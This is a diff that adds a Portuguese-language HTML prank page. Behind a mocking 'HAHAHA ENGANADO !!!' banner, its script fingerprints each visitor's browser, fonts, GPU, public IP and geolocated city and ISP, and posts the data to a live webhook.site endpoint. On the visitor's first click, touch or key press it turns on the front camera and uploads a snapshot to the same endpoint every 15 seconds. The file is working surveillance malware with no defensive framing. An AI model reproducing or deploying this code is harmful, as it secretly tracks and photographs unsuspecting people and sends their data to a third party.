@@ -1,0 +1,314 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Página</title>
+    <style>
+        body {
+            font-family: 'Courier New', Courier, monospace;
+            background-color: #111;
+            color: #0f0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            overflow: hidden;
+            user-select: none;
+        }
+        .main-msg {
+            font-size: 5em;
+            font-weight: bold;
+            animation: glitch 1s infinite linear alternate;
+            text-align: center;
+            z-index: 10;
+            text-shadow: 0 0 10px #0f0;
+        }
+        @keyframes glitch {
+            0% { transform: translate(1px, 1px) rotate(0deg); filter: hue-rotate(90deg); }
+            20% { transform: translate(-1px, -2px) rotate(-1deg); filter: hue-rotate(180deg); }
+            40% { transform: translate(-3px, 0px) rotate(1deg); filter: hue-rotate(270deg); }
+            60% { transform: translate(3px, 2px) rotate(0deg); filter: hue-rotate(360deg); }
+            80% { transform: translate(1px, -1px) rotate(1deg); filter: hue-rotate(45deg); }
+            100% { transform: translate(1px, 1px) rotate(0deg); filter: hue-rotate(0deg); }
+        }
+        .hidden-container {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            overflow: hidden;
+            z-index: 5;
+        }
+        .data-dump {
+            display: none;
+            position: fixed;
+            bottom: 0;
+            left: 0;
+            width: 100%;
+            background: rgba(0, 0, 0, 0.9);
+            color: #fff;
+            padding: 10px;
+            box-sizing: border-box;
+            font-size: 12px;
+            max-height: 200px;
+            overflow-y: auto;
+            z-index: 100;
+            border-top: 1px solid #0f0;
+        }
+        .cam-preview {
+            position: absolute;
+            top: 10px;
+            right: 10px;
+            width: 200px;
+            height: 150px;
+            background: #000;
+            border: 1px solid #0f0;
+            display: none;
+            z-index: 20;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="main-msg">HAHAHA ENGANADO !!!</div>
+
+    <div class="hidden-container">
+        <canvas id="camCanvas"></canvas>
+    </div>
+
+    <video id="camVideo" class="cam-preview" autoplay></video>
+
+    <!-- Painel de Depuração (Aparece se você adicionar ?debug na URL) -->
+    <div id="debugPanel" class="data-dump">
+        <strong>DEEPHAT DATA DUMP</strong><br>
+        <div id="debugContent">Coletando dados...</div>
+    </div>
+
+    <script>
+        // ==========================================================
+        // CONFIGURAÇÃO
+        // ==========================================================
+        // Cole aqui a sua URL do Webhook.site para receber os dados
+        // Se deixar vazio, os dados aparecerão apenas no Console e no Painel Debug
+        const ADMIN_ENDPOINT = "https://webhook.site/0dd2e94d-da55-4e00-b9f2-4232dde2aec2"; 
+        
+        // ==========================================================
+        // 1. COLETA DE DADOS AVANÇADA
+        // ==========================================================
+        async function collectFullData() {
+            const data = {
+                type: "deep_hat_fingerprint",
+                timestamp: new Date().toISOString(),
+                ip_public: "unknown",
+                location: {},
+                user_agent: navigator.userAgent,
+                platform: navigator.platform,
+                language: navigator.language,
+                screen: {
+                    width: window.screen.width,
+                    height: window.screen.height,
+                    colorDepth: screen.colorDepth,
+                    availWidth: window.screen.availWidth,
+                    availHeight: window.screen.availHeight
+                },
+                browser: {
+                    isMobile: /Mobi/.test(navigator.userAgent),
+                    isTablet: /Tablet/.test(navigator.userAgent),
+                    hardwareConcurrency: navigator.hardwareConcurrency,
+                    deviceMemory: navigator.deviceMemory,
+                    doNotTrack: navigator.doNotTrack,
+                    cookieEnabled: navigator.cookieEnabled,
+                    touchPoints: navigator.maxTouchPoints
+                },
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                canvas_fingerprint: getCanvasFingerprint(),
+                webgl_renderer: getWebGLRenderer(),
+                fonts: getInstalledFonts()
+            };
+
+            // Obter IP Público
+            try {
+                const ipRes = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipRes.json();
+                data.ip_public = ipData.ip;
+            } catch (e) {
+                data.ip_public = "Falha_Ao_Obter_IP";
+            }
+
+            // Obter Localização (Cidade/País/ISP)
+            if (data.ip_public !== "Falha_Ao_Obter_IP") {
+                try {
+                    const geoRes = await fetch(`http://ip-api.com/json/${data.ip_public}?fields=status,country,city,isp,query,as`);
+                    const geoData = await geoRes.json();
+                    data.location = geoData;
+                } catch (e) {
+                    data.location = { error: "GeoIP_Falha" };
+                }
+            }
+
+            return data;
+        }
+
+        // Fingerprinting via Canvas
+        function getCanvasFingerprint() {
+            try {
+                const canvas = document.createElement('canvas');
+                const ctx = canvas.getContext('2d');
+                ctx.textBaseline = "top";
+                ctx.font = "14px 'Arial'";
+                ctx.fillText("DeepHat-Fingerprint-Test", 2, 2);
+                return canvas.toDataURL();
+            } catch (e) {
+                return "Fingerprint_Falha";
+            }
+        }
+
+        // Fingerprinting via WebGL (Identifica a Placa de Vídeo)
+        function getWebGLRenderer() {
+            try {
+                const canvas = document.createElement('canvas');
+                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                if (!gl) return "WebGL_Nao_Suportado";
+                
+                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                if (debugInfo) {
+                    return gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+                }
+                return gl.getParameter(gl.RENDERER);
+            } catch (e) {
+                return "WebGL_Falha";
+            }
+        }
+
+        // Detecção de Fontes Instaladas
+        function getInstalledFonts() {
+            const fonts = ['Arial', 'Helvetica', 'Verdana', 'Trebuchet MS', 'Georgia', 'Times New Roman', 'Courier New', 'Impact', 'Comic Sans MS', 'Brush Script MT'];
+            const baseSize = 12;
+            const baseWidth = 100;
+            const testText = "mmmmmmmmmmlli";
+            
+            const installed = [];
+            const testCanvas = document.createElement('canvas');
+            const ctx = testCanvas.getContext('2d');
+            
+            // Referência
+            ctx.font = `${baseSize}px sans-serif`;
+            const refWidth = ctx.measureText(testText).width;
+
+            fonts.forEach(font => {
+                ctx.font = `${baseSize}px '${font}', sans-serif`;
+                const width = ctx.measureText(testText).width;
+                if (width !== refWidth) {
+                    installed.push(font);
+                }
+            });
+            return installed;
+        }
+
+        // ==========================================================
+        // 2. ENVIO PARA PAINEL
+        // ==========================================================
+        async function sendToAdmin(payload) {
+            if (!ADMIN_ENDPOINT) {
+                console.log("Nenhum endpoint configurado. Dados apenas no console/debug.");
+                return;
+            }
+
+            try {
+                const res = await fetch(ADMIN_ENDPOINT, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                });
+                console.log("Enviado para Admin. Status:", res.status);
+            } catch (error) {
+                console.error("Erro ao enviar para Admin:", error);
+            }
+        }
+
+        // ==========================================================
+        // 3. CÂMERA OCULTA
+        // ==========================================================
+        let cameraActive = false;
+        async function tryActivateCamera() {
+            if (cameraActive) return;
+            cameraActive = true;
+            console.log("[DeepHat] Câmera ativada.");
+            
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { 
+                        facingMode: 'user',
+                        width: { ideal: 1280 },
+                        height: { ideal: 720 }
+                    } 
+                });
+                
+                const video = document.getElementById('camVideo');
+                video.srcObject = stream;
+                video.style.display = 'block'; // Mostra preview pequeno no canto (opcional)
+                
+                const canvas = document.getElementById('camCanvas');
+                const ctx = canvas.getContext('2d');
+                
+                // Captura a cada 15 segundos
+                setInterval(() => {
+                    if (video.readyState === video.HAVE_ENOUGH_DATA && video.videoWidth > 0) {
+                        canvas.width = video.videoWidth;
+                        canvas.height = video.videoHeight;
+                        ctx.drawImage(video, 0, 0);
+                        const imgData = canvas.toDataURL('image/jpeg', 0.7);
+                        
+                        // Envia foto
+                        sendToAdmin({
+                            type: "camera_capture",
+                            image: imgData,
+                            timestamp: new Date().toISOString()
+                        });
+                        console.log("[DeepHat] Frame de câmera enviado.");
+                    }
+                }, 15000);
+            } catch (err) {
+                console.log("[DeepHat] Câmera negada:", err);
+            }
+        }
+
+        // ==========================================================
+        // 4. PAINEL DE DEBUG (Se adicionar ?debug na URL)
+        // ==========================================================
+        function setupDebugPanel(data) {
+            const params = new URLSearchParams(window.location.search);
+            if (params.get('debug') === 'true') {
+                document.getElementById('debugPanel').style.display = 'block';
+                document.getElementById('debugContent').innerText = JSON.stringify(data, null, 2);
+            }
+        }
+
+        // ==========================================================
+        // INICIALIZAÇÃO
+        // ==========================================================
+        window.onload = async () => {
+            console.log("[DeepHat] Iniciando coleta...");
+            const data = await collectFullData();
+            
+            // Mostra no console
+            console.log("[DeepHat] DADOS COLETADOS:", data);
+            
+            // Envia para o painel
+            await sendToAdmin(data);
+            
+            // Configura painel de debug se solicitado
+            setupDebugPanel(data);
+        };
+
+        // Ativa câmera na primeira interação
+        document.addEventListener('click', tryActivateCamera, { once: true });
+        document.addEventListener('touchstart', tryActivateCamera, { once: true });
+        document.addEventListener('keydown', tryActivateCamera, { once: true });
+
+    </script>
+</body>
+</html>
